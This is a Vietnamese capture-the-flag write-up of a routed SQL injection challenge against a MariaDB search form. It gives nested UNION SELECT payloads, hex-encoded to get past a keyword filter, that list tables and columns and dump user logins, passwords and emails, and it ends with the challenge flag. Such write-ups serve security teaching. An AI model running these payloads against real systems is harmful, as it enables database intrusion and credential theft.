# SQL Injection - Routed
## Solution

![image](https://user-images.githubusercontent.com/86184794/162607936-1fa1287f-5266-4935-984e-5c5ddd5878a2.png)

Ban đầu challenge cho em một websie như thế này. Trong website này có 2 tab cần chú ý đến đó là Home (chứa form login), Search (chứa ô input search).

Sau khi thử 1 input `1'` lần lượt vào 2 tab để kiểm tra xem tab nào có thể khai thác được.

![image](https://user-images.githubusercontent.com/86184794/162608051-a1ea292a-b88b-46e3-9a00-d32adf0dba50.png)

Em thấy bên tab Search câu truy vấn của em đã đến được server. Và server sử dụng cơ sở dữ liệu là MariaDB.

Sau đó em kiểm tra được ô input filter các kí tự như: `and`, `or` , `,` `"`

Với cách filter này thì em sẽ encode những kí tự này là bypass được rồi

Bây giờ em sẽ giải thích sơ qua về kiểu truy vấn Route SQL. Trong challenge này thì nơi mà chúng ta có thể chèn code vào đó là mệnh đề `WHERE` nhưng output của câu truy vấn không được hiện ra ngoài mà output đó tiếp tục được đưa vào 1 mệnh đề `WHERE` khác nữa, xong rồi output mới được hiện lên trên trang web.

Bình thường thì chúng ta hay sử dụng `UNION SELECT 1 -- ` thì sẽ hiện ra `1` nhưng trong trường hợp này thì không hiện ra cái gì luôn.

![image](https://user-images.githubusercontent.com/86184794/162608375-42ddc17f-28f4-48b0-b8d4-58551f88fded.png)

Như vậy ý tưởng để khai thác bài này là em sẽ tạo ra những câu truy vấn lồng nhau.

Ví dụ:
```
' union select "'union select 1 ' -- " -- 
```

Đoạn truy vấn trên sẽ vào câu lệnh đầu tiên thực hiện `' union select "{câu lệnh truy vấn tiếp theo}" --`. Output sẽ trả ra là `{câu lệnh truy vấn tiếp theo}`. Ví dụ `{câu lệnh truy vấn tiếp theo}` là `'union select 1 -- ` thì output `'union select 1 -- ` sẽ được truyền vào mệnh đề `WHERE` của câu truy vấn thứ 2. Và kết quả sau câu truy vấn thứ 2 sẽ được in ra màn hình. Bây giờ em chỉ cần đổi câu truy vấn `select 1` thành bất kì câu truy vấn gì để in ra kết quả em muốn nhưng câu truy vấn này phải convert sang hex để tránh bị server filter.

Ví dụ: 
```
' union select "' union select 1,2 -- " -- 
```
Convert sang hex sẽ thành:
```
' union select 0x2720756e696f6e2073656c65637420312c32202d2d20 -- 
```

![image](https://user-images.githubusercontent.com/86184794/162609033-38df73cf-8760-458d-acd5-85ebb301770c.png)

Challenge không hiện thông báo lỗi như vậy thì số cột trong table trả về là 2 cột.

Như vậy giờ em sẽ chọn cột thứ 2 để khai thác vì cột này là cột email nên có thể in ra các chữ, số.

Input:
```
' union select "' union select 1, group_concat(table_name) from information_schema.tables -- " -- 
```
Convert sang hex thành:
```
' union select 0x2720756e696f6e2073656c65637420312c2067726f75705f636f6e636174287461626c655f6e616d65292066726f6d20696e666f726d6174696f6e5f736368656d612e7461626c6573202d2d20 -- 
```

![image](https://user-images.githubusercontent.com/86184794/162609325-0e629b7a-1f5e-45fa-a738-f3a9c6ca8c5e.png)

Trong cơ sở dữ liệu MariaDB thì bảng được thêm vào thường nằm ở cuối.

![image](https://user-images.githubusercontent.com/86184794/162609344-26a7943b-cf9a-487c-8fef-63df582537d3.png)

Như vậy giờ em sẽ in ra các trường trong bảng `users`

Input:
```
' union select "' union select 1, group_concat(column_name) from information_schema.columns where table_name='users' -- " -- 
```
Convert sang hex sẽ thành:
```
' union select 0x2720756e696f6e2073656c65637420312c2067726f75705f636f6e63617428636f6c756d6e5f6e616d65292066726f6d20696e666f726d6174696f6e5f736368656d612e636f6c756d6e73207768657265207461626c655f6e616d653d27757365727327202d2d20 -- 
```

![image](https://user-images.githubusercontent.com/86184794/162609540-81ea72e0-d9f8-47cb-b75f-59991f925fd6.png)

Em được kết quả trong bảng `users` gồm có 4 trường là : `id`,`login`,`password`,`email`

Giờ em sẽ show ra giá trị của các trường trong bảng users

Input:
```
' union select "' union select 1, group_concat(id, ':', login, ':', password, ':', email) from users -- " -- 
```
Convet sang mã hex thành:
```
' union select 0x2720756e696f6e2073656c65637420312c2067726f75705f636f6e6361742869642c20273a272c206c6f67696e2c20273a272c2070617373776f72642c20273a272c20656d61696c292066726f6d207573657273202d2d20 -- 
```

Kết quả:
![image](https://user-images.githubusercontent.com/86184794/162609693-015253a7-882f-4a34-a183-91538ba0b7f3.png)

Flag: qs89QdAs9A
